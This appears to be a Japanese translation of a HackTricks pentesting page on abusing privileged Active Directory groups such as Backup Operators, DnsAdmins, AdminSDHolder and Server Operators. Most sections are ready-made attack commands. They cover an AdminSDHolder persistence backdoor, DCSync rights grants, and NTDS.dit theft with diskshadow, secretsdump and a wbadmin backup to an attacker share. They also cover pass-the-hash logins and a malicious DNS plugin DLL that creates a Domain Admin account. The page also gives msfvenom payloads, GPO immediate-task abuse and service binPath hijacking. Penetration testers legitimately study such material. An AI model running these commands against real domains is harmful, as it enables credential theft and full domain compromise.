# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ代表的なグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループは、ドメイン上で管理者ではないアカウントやグループを作成する権限を持っています。さらに、Domain Controller (DC) へのローカルログオンを可能にします。

このグループのメンバーを特定するには、次のコマンドを実行します：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加と、DCへのローカルログインが許可されています。

## AdminSDHolder グループ

**AdminSDHolder** グループのアクセス制御リスト (Access Control List, ACL) は重要で、Active Directory 内のすべての「保護されたグループ（protected groups）」、特に高権限グループの権限を設定します。この仕組みは、これらのグループが不正に変更されるのを防ぐことでセキュリティを確保します。

攻撃者は **AdminSDHolder** グループの ACL を変更して標準ユーザーにフル権限を付与することでこれを悪用できます。これにより、そのユーザーはすべての保護されたグループを事実上完全に制御できるようになります。このユーザーの権限が変更または削除されても、システムの設計により1時間以内に自動的に復元されます。

Recent Windows Server documentation still treats several built-in operator groups as **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). **SDProp** プロセスは既定で **PDC Emulator** 上で60分ごとに実行され、`adminCount=1` を設定し、保護されたオブジェクトの継承を無効化します。これは永続化の手段として、また保護されたグループから削除されたにもかかわらず非継承の ACL を保持している古い権限ユーザーを追跡する際に有用です。

メンバーの確認や権限変更に使用するコマンド例は次のとおりです：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復元プロセスを迅速化するスクリプトが利用可能です: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

詳細については [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) をご覧ください。

## AD Recycle Bin

このグループのメンバーであれば、削除された Active Directory オブジェクトを読み取ることができ、機密情報が露呈する可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは、**以前の権限パスを復元する**のに役立ちます。削除されたオブジェクトは `lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古い SPNs、または別のオペレーターによって後で復元される可能性のある削除された特権グループの DN を露出することがあります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### ドメインコントローラーへのアクセス

DC 上のファイルへのアクセスは、ユーザーが `Server Operators` グループのメンバーでない限り制限されており、そのグループに属することでアクセス権が変わります。

### 権限昇格

`PsService` または `sc`（Sysinternals）を使用して、サービスの権限を調査・変更できます。例えば `Server Operators` グループは特定のサービスに対して完全な制御権を持っており、任意のコマンドの実行や権限昇格を可能にします：
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドは、`Server Operators` が完全なアクセス権を持ち、サービスを操作して権限を昇格させることができることを示します。

## Backup Operators

`Backup Operators` グループへのメンバーシップは、`SeBackup` と `SeRestore` 権限により `DC01` のファイルシステムへのアクセスを提供します。これらの権限は、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用することで、明示的な許可がなくてもフォルダの走査、一覧表示、ファイルのコピーを可能にします。この処理には特定のスクリプトの利用が必要です。

グループのメンバーを一覧表示するには、次を実行してください:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの特権をローカルで利用するには、以下の手順を実行します：

1. 必要なライブラリをインポートする：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効にして確認する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 制限されたディレクトリにアクセスしてファイルをコピーする。例えば:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻撃

ドメインコントローラのファイルシステムに直接アクセスすると、ドメインのユーザーとコンピュータのすべての NTLM ハッシュを含む `NTDS.dit` データベースを窃取できます。

#### diskshadow.exe の使用

1. `C` ドライブのシャドウコピーを作成します:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーする:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
代わりに、ファイルのコピーには `robocopy` を使用してください:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. `SYSTEM` と `SAM` を抽出してハッシュを取得する:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべてのハッシュを取得する:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 抽出後: Pass-the-Hash による DA 昇格
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe の使用

1. 攻撃者マシンでSMBサーバー用にNTFSファイルシステムを設定し、対象マシンでSMB資格情報をキャッシュします。
2. システムバックアップと `NTDS.dit` の抽出に `wbadmin.exe` を使用します:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

実演については、[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) を参照してください。

## DnsAdmins

**DnsAdmins** グループのメンバーは、Domain Controllers 上でホストされていることが多い DNS サーバー上で、SYSTEM 特権で任意の DLL をロードさせることで特権を悪用できます。この機能は大きなエクスプロイトの可能性をもたらします。

DnsAdmins グループのメンバーを一覧表示するには、次を使用します:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNSサービス（通常はDC内）でSYSTEM権限の任意のコードを実行できます。
> この問題は2021年に修正されました。

メンバーは次のようなコマンドを使用して、DNSサーバーに任意のDLL（ローカルまたはリモート共有から）をロードさせることができます:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLLがロードされるには、DNSサービスの再起動（追加の権限が必要な場合があります）が必要です:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この attack vector の詳細については、ired.team を参照してください。

#### Mimilib.dll

mimilib.dll を使用してコマンド実行を行うことも可能で、特定のコマンドや reverse shells を実行するように改変できます。 [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) を参照してください。

### WPAD レコード for MitM

DnsAdmins は global query block list を無効化した後に WPAD レコードを作成することで、Man-in-the-Middle (MitM) 攻撃を行うために DNS レコードを操作できます。Responder や Inveigh のようなツールは spoofing やネットワークトラフィックのキャプチャに使用できます。

### Event Log Readers
メンバーはイベントログにアクセスでき、平文パスワードやコマンド実行の詳細などの機密情報を見つける可能性があります：
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトのDACLsを変更でき、DCSync権限を付与する可能性があります。このグループを悪用した権限昇格の手法はExchange-AD-Privesc GitHub repoに詳述されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして動作できる場合、典型的な悪用は attacker-controlled principal に対して [DCSync](dcsync.md) に必要なレプリケーション権限を付与することです:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.

### Exploitation Example

実務上の悪用は通常、古いホストレベルの LPE トリックではなく、**offline access to DC disks/checkpoints** です。Hyper-V ホストにアクセスできれば、オペレータは仮想化された Domain Controller を checkpoint または export し、VHDX をマウントして `NTDS.dit`、`SYSTEM`、およびその他のシークレットをゲスト内の LSASS に触れることなく抽出できます：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
そこから、`Backup Operators` ワークフローを再利用して `Windows\NTDS\ntds.dit` とレジストリハイブをオフラインでコピーします。

## Group Policy Creators Owners

このグループは、メンバーがドメイン内で Group Policies を作成できるようにします。ただし、メンバーはユーザーやグループに Group Policies を適用したり、既存の GPOs を編集したりすることはできません。

重要なニュアンスは、**作成者が新しい GPO の所有者になる**ことで、通常その後編集するのに十分な権限を得るということです。つまり、このグループが興味深いのは、次のいずれかが可能な場合です：

- 悪意のある GPO を作成し、管理者にそれをターゲットの OU/domain にリンクさせるよう説得する
- 既にどこか有用な場所にリンクされている、あなたが作成した GPO を編集する
- GPO をリンクできる別の委任された権利を悪用し、このグループで編集側の権限を得る

実際の悪用は通常、SYSVOL-backed policy files を通じて、**Immediate Task**、**startup script**、**local admin membership**、または**user rights assignment** の変更を追加することを意味します。
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` を通じて GPO を手動で編集する場合、その変更だけでは不十分であることに注意してください: `versionNumber`、`GPT.ini`、そして場合によっては `gPCMachineExtensionNames` も更新する必要があり、さもなければクライアントはポリシーのリフレッシュを無視します。

## Organization Management

**Microsoft Exchange** が展開されている環境では、**Organization Management** と呼ばれる特別なグループが重要な権限を持っています。このグループは **すべてのドメインユーザーのメールボックスにアクセス** する権限を持ち、'Microsoft Exchange Security Groups' の Organizational Unit (OU) に対する **完全な制御** を維持しています。この制御には **`Exchange Windows Permissions`** グループが含まれ、これが権限昇格に悪用される可能性があります。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** グループのメンバーは複数の権限を付与されており、`SeLoadDriverPrivilege` を含みます。これにより **Domain Controller にローカルでログオン** したり、シャットダウンしたり、プリンターを管理したりすることができます。これらの権限を悪用するには、特に非昇格コンテキストで `SeLoadDriverPrivilege` が見えない場合、User Account Control (UAC) をバイパスする必要があります。

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
On Domain Controllers this group is dangerous because the default Domain Controller Policy grants **`SeLoadDriverPrivilege`** to `Print Operators`. If you reach an elevated token for a member of this group, you can enable the privilege and load a signed-but-vulnerable driver to jump to kernel/SYSTEM. For token handling details, check [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

このグループのメンバーには Remote Desktop Protocol (RDP) 経由で PC へのアクセス権が付与されます。これらのメンバーを列挙するには、PowerShell のコマンドが利用できます：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP を悪用する詳細は、専用の pentesting リソースに記載されています。

#### リモート管理ユーザー

メンバーは **Windows Remote Management (WinRM)** 経由で PC にアクセスできます。これらのメンバーの列挙は次の方法で行います:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**に関連するエクスプロイト手法については、専用のドキュメントを参照してください。

#### Server Operators

このグループは、バックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンなど、ドメインコントローラー上で各種構成を行う権限を持ちます。メンバーを列挙するには、次のコマンドを使用します：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメインコントローラー上では、`Server Operators` は通常、**サービスの再構成や開始/停止** を行うのに十分な権限を継承し、またデフォルトの DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` を受け取ります。実際には、これにより彼らは **service-control abuse** と **NTDS extraction** の橋渡しになります：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
サービスのACLがこのグループに変更/開始の権限を与えている場合、サービスの実行パスを任意のコマンドに設定し、`LocalSystem`として起動してから元の`binPath`を復元します。サービス制御がロックダウンされている場合は、上記の`Backup Operators`の手法に戻り、`NTDS.dit`をコピーしてください。

## 参考文献 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
